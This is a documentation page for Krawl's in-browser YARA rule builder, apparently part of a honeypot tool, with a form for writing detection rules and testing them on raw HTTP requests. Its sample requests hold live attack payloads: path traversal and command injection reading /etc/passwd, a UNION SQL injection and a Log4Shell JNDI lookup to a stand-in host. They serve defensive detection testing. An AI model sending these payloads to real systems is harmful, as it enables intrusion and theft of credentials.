---
hide:
  - navigation
  - toc
---

# Rule builder

Build a YARA rule for Krawl, check it against Krawl's rule contract, and try
it on a request before you upload it in the dashboard's **Rules** tab. Fill in
the form, or paste or edit the rule source directly. Everything runs in your
browser.

The checks emulate YARA in JavaScript. They match the real engine on every
bundled rule and test request, but the dashboard upload still compiles with
real YARA and has the final word. How rules work is covered in
[Attack detection](detection.md).

<div id="krb" class="krb" data-meta="../assets/rules-meta.json">
  <div class="krb-layout">
    <div class="krb-form">
      <fieldset class="krb-box">
        <legend>Rule</legend>
        <div class="krb-grid">
          <label class="krb-wide">Name <span class="krb-hint">your own prefix, e.g. <code>acme_</code> or <code>krawl_custom_</code></span>
            <input type="text" data-f="name" value="acme_wp_config_backup" spellcheck="false"></label>
          <label>attack_type <span class="krb-hint">what the dashboard groups by</span>
            <input type="text" data-f="attack_type" value="config_backup_probe" maxlength="50" spellcheck="false"></label>
          <label>classification
            <select data-f="classification"><option>attack</option><option>suspicious</option></select></label>
          <label>severity <output data-out="severity">7</output>
            <input type="range" data-f="severity" min="1" max="10" value="7"></label>
          <label>confidence
            <select data-f="confidence"><option value="">(none)</option><option selected>high</option><option>medium</option><option>low</option></select></label>
          <label class="krb-wide">description
            <input type="text" data-f="description" value="Request for a backup copy of wp-config.php, which holds the database password."></label>
          <label>mitre_attack <span class="krb-hint">T1190, T1552.001</span>
            <input type="text" data-f="mitre_attack" value="T1190, T1552.001" spellcheck="false"></label>
          <label>response_type <span class="krb-hint">fake reply from the manifest</span>
            <select data-f="response_type"><option value="">(none: normal page)</option></select></label>
          <label>author <input type="text" data-f="author" value=""></label>
          <label>cve <span class="krb-hint">CVE-YYYY-NNNN</span><input type="text" data-f="cve" value="" spellcheck="false"></label>
          <label class="krb-wide">reference <input type="text" data-f="reference" value="" spellcheck="false"></label>
        </div>
        <p class="krb-variants" hidden></p>
      </fieldset>

      <fieldset class="krb-box">
        <legend>Strings</legend>
        <div class="krb-strings"></div>
        <button type="button" class="md-button krb-add">Add string</button>
      </fieldset>

      <fieldset class="krb-box">
        <legend>Condition</legend>
        <div class="krb-targets">
          <span>Fields to scan</span>
          <label><input type="checkbox" data-t="path" checked> path</label>
          <label><input type="checkbox" data-t="query"> query</label>
          <label><input type="checkbox" data-t="body"> body</label>
          <label><input type="checkbox" data-t="user_agent"> user agent</label>
          <label><input type="checkbox" data-t="header"> header</label>
          <input type="text" data-f="header_name" placeholder="header name, e.g. x-forwarded-for" hidden spellcheck="false">
        </div>
        <div class="krb-grid">
          <label>Match
            <select data-f="match"><option value="any">any of the strings</option><option value="all">all of the strings</option></select></label>
          <label>Method
            <select data-f="method"><option value="">any method</option><option>GET</option><option>POST</option><option>PUT</option><option>DELETE</option><option>PATCH</option></select></label>
        </div>
      </fieldset>
    </div>

    <aside class="krb-panel">
      <div class="krb-tabs">
        <span class="krb-title">Rule source</span>
        <label class="kcb-toggle"><input type="checkbox" class="krb-bundled"> Check as a bundled rule</label>
      </div>
      <div class="krb-dirty" hidden>Edited by hand. <button type="button" class="krb-regen">Rebuild from the form</button></div>
      <textarea class="krb-source" rows="22" wrap="off" spellcheck="false" aria-label="Rule source"></textarea>
      <ul class="krb-problems"></ul>
      <div class="krb-actions">
        <button type="button" class="md-button md-button--primary krb-copy">Copy</button>
        <button type="button" class="md-button krb-download">Download .yar</button>
      </div>
    </aside>
  </div>

  <h2 id="test-a-request">Test a request</h2>
  <div class="krb-layout">
    <div>
      <div class="krb-tabs">
        <span class="krb-title">Raw HTTP request</span>
        <select class="krb-sample" aria-label="Sample requests">
          <option value="">Load a sample…</option>
          <option value="GET /wp-config.php.bak HTTP/1.1&#10;Host: example.com&#10;User-Agent: Mozilla/5.0 zgrab/0.x">wp-config backup</option>
          <option value="GET /download?file=..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1&#10;Host: example.com&#10;User-Agent: curl/8.5.0">Path traversal</option>
          <option value="GET /products?id=1%27%20UNION%20SELECT%20username,password%20FROM%20users--%20- HTTP/1.1&#10;Host: example.com&#10;User-Agent: sqlmap/1.8">SQL injection</option>
          <option value="GET / HTTP/1.1&#10;Host: example.com&#10;User-Agent: Mozilla/5.0&#10;X-Api-Version: ${jndi:ldap://203.0.113.9:1389/a}">Log4Shell header</option>
          <option value="POST /cgi-bin/ping.cgi HTTP/1.1&#10;Host: example.com&#10;User-Agent: Mozilla/5.0&#10;Content-Type: application/x-www-form-urlencoded&#10;&#10;ip=127.0.0.1;cat+/etc/passwd">Command injection</option>
        </select>
      </div>
      <textarea class="krb-request" rows="9" spellcheck="false" aria-label="Raw HTTP request">GET /wp-config.php.bak HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0 zgrab/0.x</textarea>
      <p class="krb-hint">Request line, headers, a blank line, then the body. Krawl scans the
      path, query, body, user agent and each header on its own, raw and URL-decoded.</p>
    </div>
    <div class="krb-results" aria-live="polite"></div>
  </div>
</div>

<script src="../javascripts/yara-lite.js"></script>
<script src="../javascripts/rule-builder.js"></script>
